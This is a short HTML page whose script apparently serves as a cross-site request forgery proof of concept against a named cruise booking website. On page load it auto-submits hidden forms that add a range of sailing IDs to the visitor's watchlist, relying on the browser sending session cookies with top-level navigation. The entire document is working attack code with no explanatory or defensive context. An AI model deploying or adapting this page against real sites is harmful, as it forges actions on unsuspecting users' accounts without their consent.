<!doctype html>
<html>
  <body>
    <script>
      const startID = 770437, endID = 770441, delay = 600; // ms
      function hit(id) {
        const f = document.createElement("form");
        f.method = "GET";
        f.action = "https://www.cruises.com/brandmoversaddtowatchlist.do";
        const s = document.createElement("input");
        s.type = "hidden"; s.name = "sailingId"; s.value = id;
        f.appendChild(s);
        document.body.appendChild(f);
        f.submit(); // top-level navigation; cookies sent with SameSite=Lax
      }
      let i = startID;
      function next(){ if(i<=endID){ hit(i++); setTimeout(next, delay); } }
      next();
    </script>
  </body>
</html>
